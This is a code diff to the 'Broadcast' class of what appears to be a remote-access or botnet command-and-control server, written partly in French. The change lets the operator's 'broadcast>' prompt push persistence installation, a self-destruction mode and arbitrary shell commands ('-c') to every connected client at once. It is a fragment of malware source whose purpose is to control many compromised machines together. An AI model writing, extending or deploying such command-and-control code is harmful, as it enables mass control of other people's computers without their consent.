@@ -11,7 +11,7 @@ class Broadcast:
     checker = True
 
     def __init__(self):
-        Broadcast.checker = True
+        Broadcast.checker = True #Resets the class attribute each time the constructor is called. 
 
     def help(self):
         '''-h or --help'''
@@ -49,23 +49,27 @@ class Broadcast:
         
         self.broadcast_to_all_clients(cmd) #send command for all client
 
+    def disconnection_for_all_clients(self):
+        pass
 
-
-    def broadcast_to_all_clients(self, data, persistence=False): #A CHANGER !!!!!! persistence=False (c'est pour la persistance et la destruction !)
+    def broadcast_to_all_clients(self, data, whitout_MOD_ALL=False): 
         '''
         Note:
-        Sends an order to all customers. 
-        persistence=False avoids additional code.
-        When sending persistence to all clients, it does not send "MOD_ALL". 
-        With the "broadcast" argument of the MOD_PERSISTENCE the client does not send a response. Just it executes persistence. 
+        Sends an order to all clients. 
+        whitout_MOD_ALL=False avoids additional code.
+        When it sends persistence to all clients, it does not send "MOD_ALL". 
+        With the "broadcast" argument of MOD_PERSISTENCE, the client does not send a response. It simply executes the persistence. 
         '''
 
         request = ""
-        if not(persistence): 
+
+        if not(whitout_MOD_ALL): 
             request = "MOD_ALL:"+data
         else:
             print("GO TO SEND PERSISTENCE BB")
             request = data
+
+        print("request --->",request)
 
         for key in Handler.dict_conn.keys():
             if(Handler.dict_conn[key][NB_ALIVE]):
@@ -83,25 +87,33 @@ class Broadcast:
             printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
             
             while Broadcast.checker:
-                forall = str(input("broadcast>"))
+                forall = str(input("broadcast>")).split()
+                
                 printColor("help","[?] Command execute: {}\n".format(forall))
                 
                 for i in range(len(forall)):
+                    #print(i)
+                    try:
+                        if(forall[i] == "--back" or forall[i] == "-b"):
+                            Broadcast.checker = False #Break Broadcast
+                            break
+                        
+                        elif(forall[i] == "--help" or forall[i] == "-h"):
+                            self.help()
+                        
+                        elif(forall[i] == "--destruction"):
+                            self.broadcast_to_all_clients("MOD_DESTRUCTION:broadcast",True)
+                        
+                        elif(forall[i] == "--persistence"):
+                            self.broadcast_to_all_clients("MOD_PERSISTENCE:broadcast",True)
+                        
+                        elif(forall[i] == "-c"):
+                            self.executeCommand(forall)
+                        
+                        else:
+                            pass
 
-                    if(forall[i] == "--back" or forall[i] == "-b"):
-                        Broadcast.checker = False #Break Broadcast
-                        break
-                   
-                    elif(forall[i] == "--destruction"):
-                        pass
-                    
-                    elif(forall[i] == "--persistence"):
-                        self.broadcast_to_all_clients("MOD_PERSISTENCE:broadcast",True)
-                    
-                    elif(forall[i] == "-c"):
-                        self.executeCommand(forall)
-                    
-                    else:
+                    except IndexError:
                         pass
 
 
